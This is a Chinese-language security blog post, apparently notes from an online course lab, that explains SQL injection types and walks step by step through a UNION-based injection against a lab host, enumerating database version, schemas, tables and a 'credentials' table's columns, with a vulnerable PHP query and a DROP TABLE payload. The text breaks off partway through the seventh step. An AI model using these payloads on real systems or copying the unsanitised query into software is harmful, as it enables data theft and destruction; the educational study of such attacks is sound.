@@ -1,0 +1,1334 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    mediumzoom: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="引言: This twofold use of knowledge, that is, knowledge can be used equally for good or eveil.">
+<meta name="keywords" content="offensive,sqli">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入攻击示例 (UNION 注入)">
+<meta property="og:url" content="http://alopex.cc/2022/01/12/sqli/index.html">
+<meta property="og:site_name" content="Alopex">
+<meta property="og:description" content="引言: This twofold use of knowledge, that is, knowledge can be used equally for good or eveil.">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://alopex.cc/2022/01/12/sqli/db_request.png">
+<meta property="og:image" content="http://alopex.cc/2022/01/12/sqli/types_of_sqli.jpg">
+<meta property="og:image" content="http://alopex.cc/2022/01/12/sqli/normal.png">
+<meta property="og:image" content="http://alopex.cc/2022/01/12/sqli/single_quote.png">
+<meta property="og:image" content="http://alopex.cc/2022/01/12/sqli/souce.png">
+<meta property="og:image" content="http://alopex.cc/2022/01/12/sqli/config.png">
+<meta property="og:updated_time" content="2022-01-14T13:31:51.751Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入攻击示例 (UNION 注入)">
+<meta name="twitter:description" content="引言: This twofold use of knowledge, that is, knowledge can be used equally for good or eveil.">
+<meta name="twitter:image" content="http://alopex.cc/2022/01/12/sqli/db_request.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://alopex.cc/2022/01/12/sqli/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>SQL注入攻击示例 (UNION 注入) | Alopex</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Alopex</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">止 定 静 安 虑 得</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://alopex.cc/2022/01/12/sqli/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Alopex Cheung">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Alopex">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入攻击示例 (UNION 注入)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2022-01-12 18:04:53" itemprop="dateCreated datePublished" datetime="2022-01-12T18:04:53+08:00">2022-01-12</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2022-01-14 21:31:51" itemprop="dateModified" datetime="2022-01-14T21:31:51+08:00">2022-01-14</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/peneration/" itemprop="url" rel="index"><span itemprop="name">peneration</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/peneration/basic/" itemprop="url" rel="index"><span itemprop="name">basic</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          <br>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">16k</span>
+            </span>
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">27 分钟</span>
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="引言"><a href="#引言" class="headerlink" title="引言:"></a>引言:</h1><blockquote>
+<p>This twofold use of knowledge, that is, knowledge can be used equally for good or eveil.</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><ul>
+<li>具备网站交互基本知识</li>
+<li>具备数据库基本知识<ul>
+<li>具备SQL语言的基本操作知识</li>
+</ul>
+</li>
+</ul>
+<h1 id="正文内容"><a href="#正文内容" class="headerlink" title="正文内容"></a>正文内容</h1><p>本文的内容来自网络课程练习，而非真实环境。主要目的是梳理近来学习的知识，编辑成文，以便个人往后回顾之用。如你意外阅读到该内容，请遵守相应的法律法规，切记合法合理使用工具和知识，不要怀有侥幸心理，以免失足坠入深渊。如你继续浏览，将表明你同意不将其后学习的知识用在非法途径上，仅此。<br>闲话说完，开始正文。</p>
+<h2 id="SQL注入基本介绍"><a href="#SQL注入基本介绍" class="headerlink" title="SQL注入基本介绍"></a>SQL注入基本介绍</h2><ul>
+<li><p>背景</p>
+<ul>
+<li>在现代的网络应用结构中，服务端在浏览器侧，服务端在远程服务器侧。访问的发生：用户使用浏览器（只要符合HTTP/HTPS协议的工具即可 curl, wget也是可行的）提交URL指定需要访问的网站，网站反馈前端的静态页面（这里省略DNS,CDN等多个过程，主要关注用户端和服务端的交互），当用户尝试在页面执行如登录或搜索的作时，用户的请求通过前端的web服务器页面提交到应用服务器（其多运行php,java,python代码），应用服务器执行部分逻辑代码，当需要使用数据时，则唤醒后端的数据库服务器（Access, MySQL, SQL Server, Oracle, PostgreSQL）。</li>
+<li>该流程如下图所示</li>
+</ul>
+<p><img src="db_request.png" alt="db request"></p>
+<ul>
+<li>在这个模型中，用户端通过网络应用访问数据库服务器而无需通过帐号密码登录。数据库的安全性，无形之中转移到了网络应用开发者和数据库管理员的身上，他们的一个逻辑的漏洞那个或配置的疏忽都将会成为攻击者手中可以利用的漏洞，轻则对服务器文件进行读取，重则可以对服务器进行后门的植入，获得如同管理员一般的权限。</li>
+</ul>
+</li>
+<li><p>SQLi的含义</p>
+<ul>
+<li>为了让用户能更好地使用仿佛，网络应用一般配备了多个输入框，等待用户发出请求。即使是最简陋的网络应用，注册好帐号让用户登录，至少也需要一对用户密码输入的输入框。用户输入帐号名和密码后，应用服务器调用数据库服务器的数据进行比对，确认用户身份。这个时候，SQL就出现了，虽然用户本身从来未编写SQL访问语句，但是应用服务器与数据库交就包含了SQL语言（无论是明的SQL构建，疑惑是调用了其他库代码）。SQL语言是和数据库交互的重要语言，普通用户最多也就只有随意输入的能耐，但当网络应用面对的*是一个了解SQL语言的恶意用户，情况就会变得复杂了。这位而已用户，就会利用SQL的特性，在输入对话框中，输入相关的SQL语句，偏离对话框设定的预设用用途，恶意对数据库进行访问。这种通过在输入对话框（有时候也存在于URL）中输入SQL非法访问数据库的做法，就被称为SQL注入（Injection）。</li>
+</ul>
+</li>
+<li><p>NoSQL</p>
+<ul>
+<li>当前较为常用的数据库依然是<code>关系型数据库</code>，其数据库的交互方式便是使用SQL语言。目前还有一类较为火的数据库，被称为NoSQL（Non-relational Databases）。关系型数据库其存储模型是一个表格，非关系型数据库存储模型比较多样：包括K-V键值对,图存储，对象存储。需要注意一点NoSQL是不支持SQL语句,最流行的NoSQL是MongoDB。 NoSQL也有其相应的攻击方式，被称为<code>NoSQL Injections</code>，它和SQL注入有较大的区别，也不是本文讨论的重点。</li>
+</ul>
+</li>
+<li><p>SQLi的方式</p>
+<ul>
+<li>In-band SQLi (Classic SQLi): 带内SQL注入是最常规也是最容易被利用的SQL攻击。在简单的情况下，预期查询和新查询的输出都可以直接打印在前端，我们可以直接读取。这将会是带内攻击的一个常规场景。<ul>
+<li>Error-based SQLi：基于错误信息的SQLi是一个常会被利用的SQL攻击。在应用系统开发的过程中，使用错误信息提示开发者是十分常见的，但如果该代码在最终系统上出现，将会是一个极其危险的漏洞。</li>
+<li>Union-based SQLi (本文介绍)：基于Union的SQLi是利用SQL语句<code>UNION</code>操作，对数据库表格进行合并操作，通过联合多个<code>SELECT</code>语句生成单一结果并在相关位置进行显示的攻击。</li>
+</ul>
+</li>
+<li>Inferential SQLi (Blind SQLi)：有些时候，我们无法将SQL攻击得到的内容直接现在到页面上，这种场景的攻击被称为盲带攻击。攻击者将通过发送有效负载、观察 Web 应用程序的响应以及数据库服务器的最终行为来重建数据库结构。<ul>
+<li>Boolean-based (content-based) Blind SQLi：基于布尔的SQL注入是一种推理式的SQL注入技术，它依赖于向数据库发送一个SQL查询，迫使应用程序根据查询返回的结果是TRUE还是FALSE而返回不同的结果。根据不同的结果，HTTP响应中的内容将改变，或保持不变。这允许攻击者推断出所使用的有效载荷是返回真还是假，即使没有返回数据库的数据。这种攻击通常很慢(特别是在大型数据库上)，因为攻击者需要逐个字符地列举数据库。</li>
+<li>Time-based Blind SQLi：基于时间的SQL注入是一种推理式SQL注入技术，它依赖于向数据库发送一个SQL查询，迫使数据库在响应前等待指定的时间(以秒为单位)。响应时间将向攻击者表明查询的结果是真还是假。根据结果，HTTP响应将被延迟返回或立即返回。这允许攻击者推断所使用的有效载荷是返回真还是假，即使没有返回数据库的数据。这种攻击同样也需要耗费很长的时间在枚举数据库上。</li>
+</ul>
+</li>
+<li>Out-of-band SQLi：这种注入方式并不常见。在某些情况下，我们可能无法直接访问输出，因此我们可能必须将输出定向到远程位置，“即 DNS 记录”，然后尝试从那里检索它。这称为带外 SQL 注入。</li>
+</ul>
+<p><img src="types_of_sqli.jpg" alt="family"></p>
+</li>
+</ul>
+<h2 id="SQL注入的基本流程"><a href="#SQL注入的基本流程" class="headerlink" title="SQL注入的基本流程"></a>SQL注入的基本流程</h2><ul>
+<li><p>SQL 攻击往往源自没有对用户输入内容进行“清洗”所导致的，网络应用里所有的输入框，都应该加以防范。一旦掉以轻心，就很容易成为他人利用的一个漏洞。</p>
+</li>
+<li><p>假设以下代码是查询用户是否在系统中存在的源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$conn = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"password"</span>, <span class="string">"users"</span>);         <span class="comment"># 连接数据库</span></span><br><span class="line">$searchInput =  $_POST[<span class="string">'findUser'</span>];                                   <span class="comment"># 用户输入</span></span><br><span class="line">$query = <span class="string">"select * from logins where username like '%$searchInput'"</span>;  <span class="comment"># 拼接查询字段</span></span><br><span class="line">                                                                      <span class="comment"># 查看用户输入内容是否在`logins`表格的`username`字段中</span></span><br><span class="line">$result = $conn-&gt;query($query);                                       <span class="comment"># 通过数据库提交SQL语句</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在以上的<code>php</code>代码中，没有对用户信息进行任何的过滤。假如这是一位恶意用户，其输入<code>%1&#39;; DROP TABLE users</code>，边足以让数据库执行删除<code>users</code>这一数据表。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> logins <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'%1'</span>; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">users</span>;'</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>以下将尝试提供一个较为完整的 UNION SQL注入实例</p>
+<ul>
+<li><p>准备内容</p>
+<ul>
+<li><p>SQL相关字符在URL中的转换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+---------+-------------+</span><br><span class="line">| Payload | URL Encoded |</span><br><span class="line">+---------+-------------+</span><br><span class="line">| &apos;       | %27         |</span><br><span class="line">| &quot;       | %22         |</span><br><span class="line">| #       | %23         |</span><br><span class="line">| ;       | %3B         |</span><br><span class="line">| )       | %29         |</span><br><span class="line">+---------+-------------+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>mysql 的注释方式 <code>--</code>, <code>#</code></p>
+<ul>
+<li>由于仅使用<code>--</code> 不足以实现注释，一般其后需要跟上空格<code></code>, 因此注释一般是<code>-- -</code>, 第三个<code>-</code>仅仅是为了表明有空格</li>
+<li><code>#</code>在浏览器中会被认为是特殊字符，需要转换为<code>%23</code>才能使用</li>
+<li>综上，一般注释使用<code>-- -</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>背景： 当前有一网站，<a href="http://ip.ip.ip.ip:port/search.php&#39;" target="_blank" rel="noopener">http://ip.ip.ip.ip:port/search.php&#39;</a></p>
+</li>
+<li><p>判断sql：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> xxx <span class="keyword">where</span> port_code = <span class="string">'&#123;YOUR_QUERY&#125;'</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><img src="normal.png" alt="normal"></p>
+<ul>
+<li>当我们在输入栏输入<code>&#39;</code>后点击<code>search</code>后，发现地址栏出现了变化（参数的传递），并且在页面下出现了报错信息</li>
+</ul>
+<p><img src="single_quote.png" alt="single quote"></p>
+<ol>
+<li><p>获得当前数据表格/SCHEMA的行数（通过 order by）</p>
+<ul>
+<li><p>输入 <code>&#39; order by X -- -</code></p>
+</li>
+<li><p>前面的的<code>&#39;</code> 用于配对服务器<code>&#39;YOUR_QUERY&#39;</code>，左边的<code>&#39;</code>,使其凑成一个配对，后续进行我们需要的操作</p>
+</li>
+<li><p>order by N, 根据第N行进行排列，N是整数，数字可从1开始逐一递增到10..11,直至显示错误提示信息（<code>Unknow column X in &#39;order clause&#39;</code>）,该显示表明当前的N已超过了表格列的范围，因此表格的最终行数为<code>N-1</code></p>
+</li>
+<li><p><a href="http://167.99.202.131:32451/search.php?port_code=&#39;" target="_blank" rel="noopener">http://167.99.202.131:32451/search.php?port_code=&#39;</a> order by 1 – -</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">order</span> <span class="keyword">by</span> X <span class="comment">-- -'</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">-----------+-----------+-------------+</span></span><br><span class="line">| port code | port city | port volume |</span><br><span class="line">+<span class="comment">-----------+-----------+-------------+</span></span><br><span class="line">+<span class="comment">-----------+-----------+-------------+</span></span><br><span class="line"></span><br><span class="line">Unknow <span class="keyword">column</span> X <span class="keyword">in</span> <span class="string">'order clause'</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>获得当前在表格视图中，使用的行列信息 （通过 UNION）</p>
+<ul>
+<li><p>输入<code>&#39; union select 1,2,3,4 -- -</code></p>
+</li>
+<li><p>UNION 需要结合和表格相同的列数使用，这也是为什么需要第一步</p>
+</li>
+<li><p>假设我们第一步，输入N为5时触发了<code>Unknow</code>信息，因此表格/SCHEMA的大小为4</p>
+</li>
+<li><p>让信息在表格中相应显示，让我们知道目前表格信息使用了哪几列，便于后续展示使用</p>
+</li>
+<li><p>此处可以发现，使用到的列为<code>2,3,4</code>，估计第一列应该是<code>ID</code>信息</p>
+</li>
+<li><p><a href="http://167.99.202.131:32451/search.php?port_code=&#39;" target="_blank" rel="noopener">http://167.99.202.131:32451/search.php?port_code=&#39;</a> union select 1, 2, 3, 4 – -</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="comment">-- -'</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">-----------+-----------+-------------+</span></span><br><span class="line">| port code | port city | port volume |</span><br><span class="line">+<span class="comment">-----------+-----------+-------------+</span></span><br><span class="line">|         <span class="number">2</span> |         <span class="number">3</span> |           <span class="number">4</span> |</span><br><span class="line">+<span class="comment">-----------+-----------+-------------+</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>获得当前数据库的版本以及用户信息 （让信息在给定表格中显示）</p>
+<ul>
+<li>输入<code>&#39; union select null,@@version,user(),null -- -</code></li>
+<li>第一个<code>NULL是占位置无法显示的</code>, 最后一个NULL也没有意义，</li>
+<li><code>@@version</code>是版本信息</li>
+<li><code>user()</code>查看用户信息</li>
+<li><a href="http://167.99.202.131:32451/search.php?port_code=cn&#39;" target="_blank" rel="noopener">http://167.99.202.131:32451/search.php?port_code=cn&#39;</a> union select null,@@version,user(),null – -</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,@@<span class="keyword">version</span>,<span class="keyword">user</span>(),<span class="literal">null</span>, <span class="comment">-- -'</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">---------------------------+----------------+-------------+</span></span><br><span class="line">|         port city         |   port city    | port volume |</span><br><span class="line">+<span class="comment">---------------------------+----------------+-------------+</span></span><br><span class="line">| <span class="number">10.3</span><span class="number">.22</span>-MariaDB<span class="number">-1</span>ubuntu1  | root@localhost |             |</span><br><span class="line">+<span class="comment">---------------------------+----------------+-------------+</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>4.获得其他数据库/SCHEMA名称</p>
+<ul>
+<li><p>输入<code>&#39; union select null,SCHEMA_NAME,null,null from INFORMATION_SCHEMA.SCHEMATA -- -</code></p>
+</li>
+<li><p>查看存放数据库元信息的数据库(数据的名称，表格名称等等)<code>INFORMATION_SCHEMA</code>的表格(试图的元数据)<code>SCHEMATA</code></p>
+</li>
+<li><p><a href="http://167.99.202.131:32451/search.php?port_code=&#39;" target="_blank" rel="noopener">http://167.99.202.131:32451/search.php?port_code=&#39;</a> union select null,SCHEMA_NAME,null,null from INFORMATION_SCHEMA.SCHEMATA – -</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">union</span> \</span><br><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,SCHEMA_NAME,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> INFORMATION_SCHEMA.SCHEMATA <span class="comment">-- -'</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">--------------------+-----------+-------------+</span></span><br><span class="line">|     port city      | port city | port volume |</span><br><span class="line">+<span class="comment">--------------------+-----------+-------------+</span></span><br><span class="line">| information_schema |           |             |</span><br><span class="line">| mysql              |           |             |</span><br><span class="line">| performance_schema |           |             |</span><br><span class="line">| ilfreight          |           |             |</span><br><span class="line">| dev                |           |             |</span><br><span class="line">+<span class="comment">--------------------+-----------+-------------+</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<ol start="5">
+<li><p>获得当前使用的数据库/SCHEMA名称</p>
+<ul>
+<li>输入<code>&#39; union select null,database(),null,null -- -</code></li>
+<li>使用函数<code>database()</code>查看</li>
+<li><a href="http://167.99.202.131:32451/search.php?port_code=&#39;" target="_blank" rel="noopener">http://167.99.202.131:32451/search.php?port_code=&#39;</a> union select null,database(),null,null – -</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">database</span>(),<span class="literal">null</span>,<span class="literal">null</span> <span class="comment">-- -'</span></span><br><span class="line"></span><br><span class="line">| port city | port city | port volume |</span><br><span class="line">+<span class="comment">-----------+-----------+-------------+</span></span><br><span class="line">| ilfreight |           |             |</span><br><span class="line">+<span class="comment">-----------+-----------+-------------+</span></span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+</li>
+</ul>
+<ol start="6">
+<li><p>获得数据库/SHCEMA <code>dev</code>所包含的表格</p>
+<ul>
+<li>输入<code>&#39; union select null,TABLE_NAME,table_schema,null from information_schema.tables where table_schema=&#39;dev&#39; -- -</code></li>
+<li>联合元表格中<code>table_schema</code>字段中有<code>dev</code>的内容</li>
+<li>在表格的第一列输出表格名称<code>TABLE_NAME</code>, 第二列输出<code>数据库/SCHEMA</code></li>
+<li><a href="http://167.99.202.131:32451/search.php?port_code=&#39;" target="_blank" rel="noopener">http://167.99.202.131:32451/search.php?port_code=&#39;</a> union select null,TABLE_NAME,table_schema,null from information_schema.tables where table_schema=’dev’ – -</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> XXX <span class="keyword">where</span> port_code =<span class="string">''</span> <span class="keyword">union</span> \</span><br><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,TABLE_NAME,table_schema,<span class="literal">null</span> <span class="keyword">from</span> information_schema.tables \</span><br><span class="line"><span class="keyword">where</span> table_schema=<span class="string">'dev'</span> <span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">-------------+-----------+-------------+</span></span><br><span class="line">|  port city  | port city | port volume |</span><br><span class="line">+<span class="comment">-------------+-----------+-------------+</span></span><br><span class="line">| framework   | dev       |             |</span><br><span class="line">| pages       | dev       |             |</span><br><span class="line">| credentials | dev       |             |</span><br><span class="line">| posts       | dev       |             |</span><br><span class="line">+<span class="comment">-------------+-----------+-------------+</span></span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<ol start="7">
+<li><p>获得数据库/SCHEMA<code>dev</code>表格<code>credentials</code>相应的列名称</p>
+<ul>
+<li>输入<code>&#39; union select 1, column_name,table_name,table_schema from information_schema.columns where table_name=&#39;credentials&#39; -- -</code></li>
+<li><code>column_name</code> 提取出行名称</li>
+<li><a href="http://167.99.202.131:32451/search.php?port_code=&#39;" target="_blank" rel="noopener">http://167.99.202.131:32451/search.php?port_code=&#39;</a> union select null, column_name,table_name,table_schema from information_schema.columns where table_name=’credentials’ – -</li>
+</ul>
